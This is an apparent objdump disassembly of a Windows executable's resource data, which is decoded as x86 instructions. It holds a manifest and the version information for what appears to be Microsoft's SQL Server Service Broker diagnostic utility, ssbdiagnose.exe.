  40c09f:	add    BYTE PTR [edi+edi*1],bh
  40c0a2:	js     0x40c111
  40c0a4:	ins    BYTE PTR es:[edi],dx
  40c0a5:	and    BYTE PTR [esi+0x65],dh
  40c0a8:	jb     0x40c11d
  40c0aa:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40c0b1:	xor    BYTE PTR [edx],ah
  40c0b3:	and    BYTE PTR [ebp+0x6e],ah
  40c0b6:	arpl   WORD PTR [edi+0x64],bp
  40c0b9:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40c0c0:	inc    esi
  40c0c1:	sub    eax,0x73202238
  40c0c6:	je     0x40c129
  40c0c8:	outs   dx,BYTE PTR ds:[esi]
  40c0c9:	fs popa 
  40c0cb:	ins    BYTE PTR es:[edi],dx
  40c0cc:	outs   dx,DWORD PTR ds:[esi]
  40c0cd:	outs   dx,BYTE PTR ds:[esi]
  40c0ce:	gs cmp eax,0x73657922
  40c0d4:	and    bh,BYTE PTR [edi]
  40c0d6:	ds or  eax,0x2d213c0a
  40c0dc:	sub    eax,0x706f4320
  40c0e1:	jns    0x40c155
  40c0e3:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40c0ea:	sub    DWORD PTR [eax],esp
  40c0ec:	dec    ebp
  40c0ed:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40c0f4:	je     0x40c116
  40c0f6:	inc    ebx
  40c0f7:	outs   dx,DWORD PTR ds:[esi]
  40c0f8:	jb     0x40c16a
  40c0fa:	outs   dx,DWORD PTR ds:[esi]
  40c0fb:	jb     0x40c15e
  40c0fd:	je     0x40c168
  40c0ff:	outs   dx,DWORD PTR ds:[esi]
  40c100:	outs   dx,BYTE PTR ds:[esi]
  40c101:	and    BYTE PTR ds:0xa0d3e2d,ch
  40c107:	cmp    al,0x61
  40c109:	jae    0x40c17e
  40c10b:	gs ins DWORD PTR es:[edi],dx
  40c10d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40c111:	js     0x40c180
  40c113:	ins    BYTE PTR es:[edi],dx
  40c114:	outs   dx,BYTE PTR ds:[esi]
  40c115:	jae    0x40c154
  40c117:	and    dh,BYTE PTR [ebp+0x72]
  40c11a:	outs   dx,BYTE PTR ds:[esi]
  40c11b:	cmp    dh,BYTE PTR [ebx+0x63]
  40c11e:	push   0x73616d65
  40c123:	sub    eax,0x7263696d
  40c128:	outs   dx,DWORD PTR ds:[esi]
  40c129:	jae    0x40c19a
  40c12b:	data16 je 0x40c15b
  40c12e:	arpl   WORD PTR [edi+0x6d],bp
  40c131:	cmp    ah,BYTE PTR [ecx+0x73]
  40c134:	ins    DWORD PTR es:[edi],dx
  40c135:	cs jbe 0x40c169
  40c138:	and    ah,BYTE PTR [eax]
  40c13a:	ins    DWORD PTR es:[edi],dx
  40c13b:	popa   
  40c13c:	outs   dx,BYTE PTR ds:[esi]
  40c13d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40c144:	jb     0x40c1b9
  40c146:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40c14d:	xor    BYTE PTR [edx],ah
  40c14f:	and    BYTE PTR ds:0x3c20200a,cl
  40c156:	popa   
  40c157:	jae    0x40c1cc
  40c159:	gs ins DWORD PTR es:[edi],dx
  40c15b:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40c15f:	fs outs dx,BYTE PTR gs:[esi]
  40c162:	je     0x40c1cd
  40c164:	je     0x40c1df
  40c166:	and    BYTE PTR [esi+0x65],dh
  40c169:	jb     0x40c1de
  40c16b:	imul   ebp,DWORD PTR [edi+0x6e],0x3131223d
  40c172:	xor    BYTE PTR cs:[esi],ch
  40c175:	xor    dh,BYTE PTR [ecx]
  40c177:	xor    BYTE PTR [eax],dh
  40c179:	cs xor BYTE PTR ss:[edx],ah
  40c17d:	or     eax,0x2020200a
  40c182:	and    BYTE PTR [eax],ah
  40c184:	jo     0x40c1f8
  40c186:	outs   dx,DWORD PTR ds:[esi]
  40c187:	arpl   WORD PTR [ebp+0x73],sp
  40c18a:	jae    0x40c1fb
  40c18c:	jb     0x40c1cf
  40c18e:	jb     0x40c1f3
  40c190:	push   0x63657469
  40c195:	je     0x40c20c
  40c197:	jb     0x40c1fe
  40c199:	cmp    eax,0x646d6122
  40c19e:	ss xor al,0x22
  40c1a1:	or     eax,0x2020200a
  40c1a6:	and    BYTE PTR [eax],ah
  40c1a8:	outs   dx,BYTE PTR ds:[esi]
  40c1a9:	popa   
  40c1aa:	ins    DWORD PTR es:[edi],dx
  40c1ab:	gs cmp eax,0x62737322
  40c1b1:	imul   esp,DWORD PTR fs:[ecx+0x67],0x65736f6e
  40c1b9:	cs gs js 0x40c222
  40c1bd:	and    cl,BYTE PTR ds:0x2020200a
  40c1c3:	and    BYTE PTR [eax],ah
  40c1c5:	je     0x40c240
  40c1c7:	jo     0x40c22e
  40c1c9:	cmp    eax,0x6e697722
  40c1ce:	xor    esi,DWORD PTR [edx]
  40c1d0:	and    ch,BYTE PTR [edi]
  40c1d2:	and    BYTE PTR ds:0x3c20200a,cl
  40c1d9:	fs gs jae 0x40c240
  40c1dd:	jb     0x40c248
  40c1df:	jo     0x40c255
  40c1e1:	imul   ebp,DWORD PTR [edi+0x6e],0x7265533e
  40c1e8:	jbe    0x40c253
  40c1ea:	arpl   WORD PTR [ebp+0x20],sp
  40c1ed:	inc    edx
  40c1ee:	jb     0x40c25f
  40c1f0:	imul   esp,DWORD PTR [ebp+0x72],0x20
  40c1f4:	inc    esp
  40c1f5:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  40c1fc:	imul   esp,DWORD PTR [ebx+0x20],0x6c697455
  40c203:	imul   esi,DWORD PTR [ecx+edi*2+0x3c],0x7365642f
  40c20b:	arpl   WORD PTR [edx+0x69],si
  40c20e:	jo     0x40c284
  40c210:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d203e
  40c217:	and    BYTE PTR [eax],ah
  40c219:	cmp    al,0x21
  40c21b:	sub    eax,0x6449202d
  40c220:	outs   dx,BYTE PTR gs:[esi]
  40c222:	je     0x40c28d
  40c224:	data16 jns 0x40c247
  40c227:	je     0x40c291
  40c229:	and    BYTE PTR gs:[ecx+0x70],ah
  40c22d:	jo     0x40c29b
  40c22f:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  40c236:	and    BYTE PTR [ebx+0x65],dh
  40c239:	arpl   WORD PTR [ebp+0x72],si
  40c23c:	imul   esi,DWORD PTR [ecx+edi*2+0x20],0x75716572
  40c244:	imul   esi,DWORD PTR [edx+0x65],0x746e656d
  40c24b:	jae    0x40c27b
  40c24d:	and    BYTE PTR ds:0xa0d3e2d,ch
  40c253:	and    BYTE PTR [eax],ah
  40c255:	cmp    al,0x74
  40c257:	jb     0x40c2ce
  40c259:	jae    0x40c2cf
  40c25b:	dec    ecx
  40c25c:	outs   dx,BYTE PTR ds:[esi]
  40c25d:	outs   dx,WORD PTR ds:[esi]
  40c25f:	and    BYTE PTR [eax+0x6d],bh
  40c262:	ins    BYTE PTR es:[edi],dx
  40c263:	outs   dx,BYTE PTR ds:[esi]
  40c264:	jae    0x40c2a3
  40c266:	and    dh,BYTE PTR [ebp+0x72]
  40c269:	outs   dx,BYTE PTR ds:[esi]
  40c26a:	cmp    dh,BYTE PTR [ebx+0x63]
  40c26d:	push   0x73616d65
  40c272:	sub    eax,0x7263696d
  40c277:	outs   dx,DWORD PTR ds:[esi]
  40c278:	jae    0x40c2e9
  40c27a:	data16 je 0x40c2aa
  40c27d:	arpl   WORD PTR [edi+0x6d],bp
  40c280:	cmp    ah,BYTE PTR [ecx+0x73]
  40c283:	ins    DWORD PTR es:[edi],dx
  40c284:	cs jbe 0x40c2b9
  40c287:	and    bh,BYTE PTR [esi]
  40c289:	or     eax,0x2020200a
  40c28e:	and    BYTE PTR [ebx+esi*2],bh
  40c291:	arpl   WORD PTR gs:[ebp+0x72],si
  40c295:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40c29d:	and    BYTE PTR [eax],ah
  40c29f:	and    BYTE PTR [eax],ah
  40c2a1:	cmp    al,0x72
  40c2a3:	gs jno 0x40c31b
  40c2a6:	gs jae 0x40c31d
  40c2a9:	gs fs push eax
  40c2ac:	jb     0x40c317
  40c2ae:	jbe    0x40c319
  40c2b0:	ins    BYTE PTR es:[edi],dx
  40c2b1:	gs addr16 gs jae 0x40c2f4
  40c2b6:	or     eax,0x2020200a
  40c2bb:	and    BYTE PTR [eax],ah
  40c2bd:	and    BYTE PTR [eax],ah
  40c2bf:	and    BYTE PTR [edx+esi*2],bh
  40c2c2:	gs jno 0x40c33a
  40c2c5:	gs jae 0x40c33c
  40c2c8:	gs fs inc ebp
  40c2cb:	js     0x40c332
  40c2cd:	arpl   WORD PTR [ebp+0x74],si
  40c2d0:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40c2d7:	ins    BYTE PTR es:[edi],dx
  40c2d8:	or     eax,0x2020200a
  40c2dd:	and    BYTE PTR [eax],ah
  40c2df:	and    BYTE PTR [eax],ah
  40c2e1:	and    BYTE PTR [eax],ah
  40c2e3:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  40c2e7:	gs ins BYTE PTR es:[edi],dx
  40c2e9:	cmp    eax,0x49736122
  40c2ee:	outs   dx,BYTE PTR ds:[esi]
  40c2ef:	jbe    0x40c360
  40c2f1:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40c2f5:	or     eax,0x2020200a
  40c2fa:	and    BYTE PTR [eax],ah
  40c2fc:	and    BYTE PTR [eax],ah
  40c2fe:	and    BYTE PTR [eax],ah
  40c300:	and    BYTE PTR [ebp+0x69],dh
  40c303:	inc    ecx
  40c304:	arpl   WORD PTR [ebx+0x65],sp
  40c307:	jae    0x40c37c
  40c309:	cmp    eax,0x6c616622
  40c30e:	jae    0x40c375
  40c310:	and    ch,BYTE PTR [edi]
  40c312:	ds or  eax,0x2020200a
  40c318:	and    BYTE PTR [eax],ah
  40c31a:	and    BYTE PTR [eax],ah
  40c31c:	and    BYTE PTR [edi+ebp*1],bh
  40c31f:	jb     0x40c386
  40c321:	jno    0x40c398
  40c323:	gs jae 0x40c39a
  40c326:	gs fs push eax
  40c329:	jb     0x40c394
  40c32b:	jbe    0x40c396
  40c32d:	ins    BYTE PTR es:[edi],dx
  40c32e:	gs addr16 gs jae 0x40c371
  40c333:	or     eax,0x2020200a
  40c338:	and    BYTE PTR [eax],ah
  40c33a:	and    BYTE PTR [eax],ah
  40c33c:	cmp    al,0x2f
  40c33e:	jae    0x40c3a5
  40c340:	arpl   WORD PTR [ebp+0x72],si
  40c343:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40c34b:	cmp    al,0x2f
  40c34d:	je     0x40c3c1
  40c34f:	jne    0x40c3c4
  40c351:	je     0x40c39c
  40c353:	outs   dx,BYTE PTR ds:[esi]
  40c354:	outs   dx,WORD PTR ds:[esi]
  40c356:	ds or  eax,0x612f3c0a
  40c35c:	jae    0x40c3d1
  40c35e:	gs ins DWORD PTR es:[edi],dx
  40c360:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40c364:	or     eax,0xac00000a
  40c369:	add    al,0x34
  40c36b:	add    BYTE PTR [eax],al
  40c36d:	add    BYTE PTR [esi+0x0],dl
  40c370:	push   ebx
  40c371:	add    BYTE PTR [edi+0x0],bl
  40c374:	push   esi
  40c375:	add    BYTE PTR [ebp+0x0],al
  40c378:	push   edx
  40c379:	add    BYTE PTR [ebx+0x0],dl
  40c37c:	dec    ecx
  40c37d:	add    BYTE PTR [edi+0x0],cl
  40c380:	dec    esi
  40c381:	add    BYTE PTR [edi+0x0],bl
  40c384:	dec    ecx
  40c385:	add    BYTE PTR [esi+0x0],cl
  40c388:	inc    esi
  40c389:	add    BYTE PTR [edi+0x0],cl
  40c38c:	add    BYTE PTR [eax],al
  40c38e:	add    BYTE PTR [eax],al
  40c390:	mov    ebp,0xfeef04
  40c395:	add    BYTE PTR [ecx],al
  40c397:	add    BYTE PTR [eax],al
  40c399:	add    BYTE PTR [ebx],cl
  40c39b:	add    BYTE PTR [eax+eax*1],bh
  40c39e:	xor    al,0x8
  40c3a0:	add    BYTE PTR [eax],al
  40c3a2:	or     eax,DWORD PTR [eax]
  40c3a4:	cmp    al,0x0
  40c3a6:	xor    al,0x8
  40c3a8:	aas    
  40c3a9:	add    BYTE PTR [eax],al
  40c3ab:	add    BYTE PTR [eax],cl
  40c3ad:	add    BYTE PTR [eax],al
  40c3af:	add    BYTE PTR [eax],al
  40c3b1:	add    BYTE PTR [eax+eax*1],al
  40c3b4:	add    DWORD PTR [eax],eax
	...
  40c3c2:	add    BYTE PTR [eax],al
  40c3c4:	or     al,BYTE PTR [eax+eax*1]
  40c3c7:	add    BYTE PTR [ecx],al
  40c3c9:	add    BYTE PTR [ebx+0x0],dl
  40c3cc:	je     0x40c3ce
  40c3ce:	jb     0x40c3d0
  40c3d0:	imul   eax,DWORD PTR [eax],0x67006e
  40c3d6:	inc    esi
  40c3d7:	add    BYTE PTR [ecx+0x0],ch
  40c3da:	ins    BYTE PTR es:[edi],dx
  40c3db:	add    BYTE PTR [ebp+0x0],ah
  40c3de:	dec    ecx
  40c3df:	add    BYTE PTR [esi+0x0],ch
  40c3e2:	data16 add BYTE PTR [edi+0x0],ch
  40c3e6:	add    BYTE PTR [eax],al
  40c3e8:	out    0x3,al
  40c3ea:	add    BYTE PTR [eax],al
  40c3ec:	add    DWORD PTR [eax],eax
  40c3ee:	xor    BYTE PTR [eax],al
  40c3f0:	xor    al,0x0
  40c3f2:	xor    BYTE PTR [eax],al
  40c3f4:	cmp    DWORD PTR [eax],eax
  40c3f6:	xor    BYTE PTR [eax],al
  40c3f8:	xor    al,0x0
  40c3fa:	inc    edx
  40c3fb:	add    BYTE PTR [eax],dh
  40c3fd:	add    BYTE PTR [eax],al
  40c3ff:	add    BYTE PTR [esi],ah
  40c401:	add    BYTE PTR [edi],al
  40c403:	add    BYTE PTR [ecx],al
  40c405:	add    BYTE PTR [eax+0x0],dl
  40c408:	ins    BYTE PTR es:[edi],dx
  40c409:	add    BYTE PTR [ecx+0x0],ah
  40c40c:	je     0x40c40e
  40c40e:	data16 add BYTE PTR [edi+0x0],ch
  40c412:	jb     0x40c414
  40c414:	ins    DWORD PTR es:[edi],dx
  40c415:	add    BYTE PTR [eax],al
  40c417:	add    BYTE PTR [esi+0x0],cl
  40c41a:	push   esp
  40c41b:	add    BYTE PTR [eax],ah
  40c41d:	add    BYTE PTR [eax+0x0],bh
  40c420:	add    BYTE PTR ss:[eax+eax*1],dh
  40c424:	add    BYTE PTR [eax],al
  40c426:	add    BYTE PTR [eax],al
  40c428:	mov    edx,0x1004900
  40c42d:	add    BYTE PTR [eax+eax*1+0x65],cl
  40c431:	add    BYTE PTR [edi+0x0],ah
  40c434:	popa   
  40c435:	add    BYTE PTR [eax+eax*1+0x54],ch
  40c439:	add    BYTE PTR [edx+0x0],dh
  40c43c:	popa   
  40c43d:	add    BYTE PTR [eax+eax*1+0x65],ah
  40c441:	add    BYTE PTR [ebp+0x0],ch
  40c444:	popa   
  40c445:	add    BYTE PTR [edx+0x0],dh
  40c448:	imul   eax,DWORD PTR [eax],0x73
  40c44b:	add    BYTE PTR [eax],al
  40c44d:	add    BYTE PTR [eax],al
  40c44f:	add    BYTE PTR [ebp+0x0],cl
  40c452:	imul   eax,DWORD PTR [eax],0x720063
  40c458:	outs   dx,DWORD PTR ds:[esi]
  40c459:	add    BYTE PTR [ebx+0x0],dh
  40c45c:	outs   dx,DWORD PTR ds:[esi]
  40c45d:	add    BYTE PTR [esi+0x0],ah
  40c460:	je     0x40c462
  40c462:	and    BYTE PTR [eax],al
  40c464:	push   ebx
  40c465:	add    BYTE PTR [ecx+0x0],dl
  40c468:	dec    esp
  40c469:	add    BYTE PTR [eax],ah
  40c46b:	add    BYTE PTR [ebx+0x0],dl
  40c46e:	add    BYTE PTR gs:[edx+0x0],dh
  40c472:	jbe    0x40c474
  40c474:	add    BYTE PTR gs:[edx+0x0],dh
  40c478:	and    BYTE PTR [eax],al
  40c47a:	imul   eax,DWORD PTR [eax],0x200073
  40c480:	popa   
  40c481:	add    BYTE PTR [eax],ah
  40c483:	add    BYTE PTR [edx+0x0],dh
  40c486:	add    BYTE PTR gs:[edi+0x0],ah
  40c48a:	imul   eax,DWORD PTR [eax],0x740073
  40c490:	add    BYTE PTR gs:[edx+0x0],dh
  40c494:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  40c499:	add    BYTE PTR [eax+eax*1+0x72],dh
  40c49d:	add    BYTE PTR [ecx+0x0],ah
  40c4a0:	add    BYTE PTR fs:[ebp+0x0],ah
  40c4a4:	ins    DWORD PTR es:[edi],dx
  40c4a5:	add    BYTE PTR [ecx+0x0],ah
  40c4a8:	jb     0x40c4aa
  40c4aa:	imul   eax,DWORD PTR [eax],0x20
  40c4ad:	add    BYTE PTR [edi+0x0],ch
  40c4b0:	data16 add BYTE PTR [eax],ah
  40c4b3:	add    BYTE PTR [ebp+0x0],cl
  40c4b6:	imul   eax,DWORD PTR [eax],0x720063
  40c4bc:	outs   dx,DWORD PTR ds:[esi]
  40c4bd:	add    BYTE PTR [ebx+0x0],dh
  40c4c0:	outs   dx,DWORD PTR ds:[esi]
  40c4c1:	add    BYTE PTR [esi+0x0],ah
  40c4c4:	je     0x40c4c6
  40c4c6:	and    BYTE PTR [eax],al
  40c4c8:	inc    ebx
  40c4c9:	add    BYTE PTR [edi+0x0],ch
  40c4cc:	jb     0x40c4ce
  40c4ce:	jo     0x40c4d0
  40c4d0:	outs   dx,DWORD PTR ds:[esi]
  40c4d1:	add    BYTE PTR [edx+0x0],dh
  40c4d4:	popa   
  40c4d5:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c4d9:	add    BYTE PTR [edi+0x0],ch
  40c4dc:	outs   dx,BYTE PTR ds:[esi]
  40c4dd:	add    BYTE PTR [esi],ch
  40c4df:	add    BYTE PTR [eax],al
  40c4e1:	add    BYTE PTR [eax],al
  40c4e3:	add    BYTE PTR [eax],ah
  40c4e5:	add    BYTE PTR [eax+eax*1],al
  40c4e8:	add    DWORD PTR [eax],eax
  40c4ea:	inc    ebx
  40c4eb:	add    BYTE PTR [edi+0x0],ch
  40c4ee:	ins    DWORD PTR es:[edi],dx
  40c4ef:	add    BYTE PTR [ebp+0x0],ch
  40c4f2:	add    BYTE PTR gs:[esi+0x0],ch
  40c4f6:	je     0x40c4f8
  40c4f8:	jae    0x40c4fa
  40c4fa:	add    BYTE PTR [eax],al
  40c4fc:	push   ebx
  40c4fd:	add    BYTE PTR [ecx+0x0],dl
  40c500:	dec    esp
  40c501:	add    BYTE PTR [eax],al
  40c503:	add    BYTE PTR [esi],ah
  40c505:	add    BYTE PTR ds:0x47000100,al
  40c50b:	add    BYTE PTR [edi+0x0],ch
  40c50e:	ins    BYTE PTR es:[edi],dx
  40c50f:	add    BYTE PTR [eax+eax*1+0x65],ah
  40c513:	add    BYTE PTR [esi+0x0],ch
  40c516:	inc    edx
  40c517:	add    BYTE PTR [ecx+0x0],ch
  40c51a:	je     0x40c51c
  40c51c:	jae    0x40c51e
  40c51e:	add    BYTE PTR [eax],al
  40c520:	push   esp
  40c521:	add    BYTE PTR [edx+0x0],dh
  40c524:	jne    0x40c526
  40c526:	add    BYTE PTR gs:[eax],al
  40c529:	add    BYTE PTR [eax],al
  40c52b:	add    BYTE PTR [eax+eax*1+0x16],cl
  40c52f:	add    BYTE PTR [ecx],al
  40c531:	add    BYTE PTR [ebx+0x0],al
  40c534:	outs   dx,DWORD PTR ds:[esi]
  40c535:	add    BYTE PTR [ebp+0x0],ch
  40c538:	jo     0x40c53a
  40c53a:	popa   
  40c53b:	add    BYTE PTR [esi+0x0],ch
  40c53e:	jns    0x40c540
  40c540:	dec    esi
  40c541:	add    BYTE PTR [ecx+0x0],ah
  40c544:	ins    DWORD PTR es:[edi],dx
  40c545:	add    BYTE PTR [ebp+0x0],ah
  40c548:	add    BYTE PTR [eax],al
  40c54a:	add    BYTE PTR [eax],al
  40c54c:	dec    ebp
  40c54d:	add    BYTE PTR [ecx+0x0],ch
  40c550:	arpl   WORD PTR [eax],ax
  40c552:	jb     0x40c554
  40c554:	outs   dx,DWORD PTR ds:[esi]
  40c555:	add    BYTE PTR [ebx+0x0],dh
  40c558:	outs   dx,DWORD PTR ds:[esi]
  40c559:	add    BYTE PTR [esi+0x0],ah
  40c55c:	je     0x40c55e
  40c55e:	and    BYTE PTR [eax],al
  40c560:	inc    ebx
  40c561:	add    BYTE PTR [edi+0x0],ch
  40c564:	jb     0x40c566
  40c566:	jo     0x40c568
  40c568:	outs   dx,DWORD PTR ds:[esi]
  40c569:	add    BYTE PTR [edx+0x0],dh
  40c56c:	popa   
  40c56d:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c571:	add    BYTE PTR [edi+0x0],ch
  40c574:	outs   dx,BYTE PTR ds:[esi]
  40c575:	add    BYTE PTR [eax],al
  40c577:	add    BYTE PTR [eax+eax*1+0x22],ch
  40c57b:	add    BYTE PTR [ecx],al
  40c57d:	add    BYTE PTR [esi+0x0],al
  40c580:	imul   eax,DWORD PTR [eax],0x65006c
  40c586:	inc    esp
  40c587:	add    BYTE PTR [ebp+0x0],ah
  40c58a:	jae    0x40c58c
  40c58c:	arpl   WORD PTR [eax],ax
  40c58e:	jb     0x40c590
  40c590:	imul   eax,DWORD PTR [eax],0x740070
  40c596:	imul   eax,DWORD PTR [eax],0x6e006f
  40c59c:	add    BYTE PTR [eax],al
  40c59e:	add    BYTE PTR [eax],al
  40c5a0:	push   ebx
  40c5a1:	add    BYTE PTR [ebp+0x0],ah
  40c5a4:	jb     0x40c5a6
  40c5a6:	jbe    0x40c5a8
  40c5a8:	imul   eax,DWORD PTR [eax],0x650063
  40c5ae:	and    BYTE PTR [eax],al
  40c5b0:	inc    edx
  40c5b1:	add    BYTE PTR [edx+0x0],dh
  40c5b4:	outs   dx,DWORD PTR ds:[esi]
  40c5b5:	add    BYTE PTR [ebx+0x0],ch
  40c5b8:	add    BYTE PTR gs:[edx+0x0],dh
  40c5bc:	and    BYTE PTR [eax],al
  40c5be:	inc    esp
  40c5bf:	add    BYTE PTR [ecx+0x0],ch
  40c5c2:	popa   
  40c5c3:	add    BYTE PTR [edi+0x0],ah
  40c5c6:	outs   dx,BYTE PTR ds:[esi]
  40c5c7:	add    BYTE PTR [edi+0x0],ch
  40c5ca:	jae    0x40c5cc
  40c5cc:	je     0x40c5ce
  40c5ce:	imul   eax,DWORD PTR [eax],0x200063
  40c5d4:	push   ebp
  40c5d5:	add    BYTE PTR [eax+eax*1+0x69],dh
  40c5d9:	add    BYTE PTR [eax+eax*1+0x69],ch
  40c5dd:	add    BYTE PTR [eax+eax*1+0x79],dh
  40c5e1:	add    BYTE PTR [eax],al
  40c5e3:	add    BYTE PTR [eax+0x0],dh
  40c5e6:	sub    BYTE PTR [eax],al
  40c5e8:	add    DWORD PTR [eax],eax
  40c5ea:	inc    esi
  40c5eb:	add    BYTE PTR [ecx+0x0],ch
  40c5ee:	ins    BYTE PTR es:[edi],dx
  40c5ef:	add    BYTE PTR [ebp+0x0],ah
  40c5f2:	push   esi
  40c5f3:	add    BYTE PTR [ebp+0x0],ah
  40c5f6:	jb     0x40c5f8
  40c5f8:	jae    0x40c5fa
  40c5fa:	imul   eax,DWORD PTR [eax],0x6e006f
  40c600:	add    BYTE PTR [eax],al
  40c602:	add    BYTE PTR [eax],al
  40c604:	xor    DWORD PTR [eax],eax
  40c606:	xor    DWORD PTR [eax],eax
  40c608:	add    BYTE PTR cs:[eax],dh
  40c60b:	add    BYTE PTR [esi],ch
  40c60d:	add    BYTE PTR [edx],dh
  40c60f:	add    BYTE PTR [ecx],dh
  40c611:	add    BYTE PTR [eax],dh
  40c613:	add    BYTE PTR [eax],dh
  40c615:	add    BYTE PTR [esi],ch
  40c617:	add    BYTE PTR [esi],dh
  40c619:	add    BYTE PTR [eax],dh
  40c61b:	add    BYTE PTR [eax],ah
  40c61d:	add    BYTE PTR [eax],ch
  40c61f:	add    BYTE PTR [eax],ch
  40c621:	add    BYTE PTR [ebx+0x0],dl
  40c624:	push   ecx
  40c625:	add    BYTE PTR [eax+eax*1+0x31],cl
  40c629:	add    BYTE PTR [ecx],dh
  40c62b:	add    BYTE PTR [edi+0x0],bl
  40c62e:	push   edx
  40c62f:	add    BYTE PTR [eax+eax*1+0x4d],dl
  40c633:	add    BYTE PTR [ecx],ch
  40c635:	add    BYTE PTR [esi],ch
  40c637:	add    BYTE PTR [ecx],dh
  40c639:	add    BYTE PTR [edx],dh
  40c63b:	add    BYTE PTR [eax],dh
  40c63d:	add    BYTE PTR [edx],dh
  40c63f:	add    BYTE PTR [ecx],dh
  40c641:	add    BYTE PTR [eax],dh
  40c643:	add    BYTE PTR ds:0x39003100,ch
  40c649:	add    BYTE PTR [ecx],dh
  40c64b:	add    BYTE PTR [edi],dh
  40c64d:	add    BYTE PTR [eax],ah
  40c64f:	add    BYTE PTR [ecx],ch
  40c651:	add    BYTE PTR [eax],al
  40c653:	add    BYTE PTR [eax],bh
  40c655:	add    BYTE PTR [eax+eax*1],cl
  40c658:	add    DWORD PTR [eax],eax
  40c65a:	dec    ecx
  40c65b:	add    BYTE PTR [esi+0x0],ch
  40c65e:	je     0x40c660
  40c660:	add    BYTE PTR gs:[edx+0x0],dh
  40c664:	outs   dx,BYTE PTR ds:[esi]
  40c665:	add    BYTE PTR [ecx+0x0],ah
  40c668:	ins    BYTE PTR es:[edi],dx
  40c669:	add    BYTE PTR [esi+0x0],cl
  40c66c:	popa   
  40c66d:	add    BYTE PTR [ebp+0x0],ch
  40c670:	add    BYTE PTR gs:[eax],al
  40c673:	add    BYTE PTR [ebx+0x0],dl
  40c676:	push   ebx
  40c677:	add    BYTE PTR [edx+0x0],al
  40c67a:	inc    esp
  40c67b:	add    BYTE PTR [ecx+0x0],ch
  40c67e:	popa   
  40c67f:	add    BYTE PTR [edi+0x0],ah
  40c682:	outs   dx,BYTE PTR ds:[esi]
  40c683:	add    BYTE PTR [edi+0x0],ch
  40c686:	jae    0x40c688
  40c688:	add    BYTE PTR gs:[eax],al
  40c68b:	add    BYTE PTR [esi+0x0],ch
  40c68e:	and    eax,0x4c000100
  40c693:	add    BYTE PTR [ebp+0x0],ah
  40c696:	add    BYTE PTR [bx+di+0x0],ah
  40c69a:	ins    BYTE PTR es:[edi],dx
  40c69b:	add    BYTE PTR [ebx+0x0],al
  40c69e:	outs   dx,DWORD PTR ds:[esi]
  40c69f:	add    BYTE PTR [eax+0x0],dh
  40c6a2:	jns    0x40c6a4
  40c6a4:	jb     0x40c6a6
  40c6a6:	imul   eax,DWORD PTR [eax],0x680067
  40c6ac:	je     0x40c6ae
  40c6ae:	add    BYTE PTR [eax],al
  40c6b0:	dec    ebp
  40c6b1:	add    BYTE PTR [ecx+0x0],ch
  40c6b4:	arpl   WORD PTR [eax],ax
  40c6b6:	jb     0x40c6b8
  40c6b8:	outs   dx,DWORD PTR ds:[esi]
  40c6b9:	add    BYTE PTR [ebx+0x0],dh
  40c6bc:	outs   dx,DWORD PTR ds:[esi]
  40c6bd:	add    BYTE PTR [esi+0x0],ah
  40c6c0:	je     0x40c6c2
  40c6c2:	and    BYTE PTR [eax],al
  40c6c4:	inc    ebx
  40c6c5:	add    BYTE PTR [edi+0x0],ch
  40c6c8:	jb     0x40c6ca
  40c6ca:	jo     0x40c6cc
  40c6cc:	add    BYTE PTR cs:[eax],ah
  40c6cf:	add    BYTE PTR [ecx+0x0],al
  40c6d2:	ins    BYTE PTR es:[edi],dx
  40c6d3:	add    BYTE PTR [eax+eax*1+0x20],ch
  40c6d7:	add    BYTE PTR [edx+0x0],dh
  40c6da:	imul   eax,DWORD PTR [eax],0x680067
  40c6e0:	je     0x40c6e2
  40c6e2:	jae    0x40c6e4
  40c6e4:	and    BYTE PTR [eax],al
  40c6e6:	jb     0x40c6e8
  40c6e8:	add    BYTE PTR gs:[ebx+0x0],dh
  40c6ec:	add    BYTE PTR gs:[edx+0x0],dh
  40c6f0:	jbe    0x40c6f2
  40c6f2:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40c6f7:	add    BYTE PTR [eax],al
  40c6f9:	add    BYTE PTR [eax],al
  40c6fb:	add    BYTE PTR [eax+0x0],cl
  40c6fe:	adc    BYTE PTR [eax],al
  40c700:	add    DWORD PTR [eax],eax
  40c702:	dec    edi
  40c703:	add    BYTE PTR [edx+0x0],dh
  40c706:	imul   eax,DWORD PTR [eax],0x690067
  40c70c:	outs   dx,BYTE PTR ds:[esi]
  40c70d:	add    BYTE PTR [ecx+0x0],ah
  40c710:	ins    BYTE PTR es:[edi],dx
  40c711:	add    BYTE PTR [esi+0x0],al
  40c714:	imul   eax,DWORD PTR [eax],0x65006c
  40c71a:	outs   dx,BYTE PTR ds:[esi]
  40c71b:	add    BYTE PTR [ecx+0x0],ah
  40c71e:	ins    DWORD PTR es:[edi],dx
  40c71f:	add    BYTE PTR [ebp+0x0],ah
  40c722:	add    BYTE PTR [eax],al
  40c724:	push   ebx
  40c725:	add    BYTE PTR [ebx+0x0],dl
  40c728:	inc    edx
  40c729:	add    BYTE PTR [eax+eax*1+0x69],al
  40c72d:	add    BYTE PTR [ecx+0x0],ah
  40c730:	add    BYTE PTR [bp+0x0],ch
  40c734:	outs   dx,DWORD PTR ds:[esi]
  40c735:	add    BYTE PTR [ebx+0x0],dh
  40c738:	add    BYTE PTR gs:[esi],ch
  40c73b:	add    BYTE PTR [ebp+0x0],al
  40c73e:	pop    eax
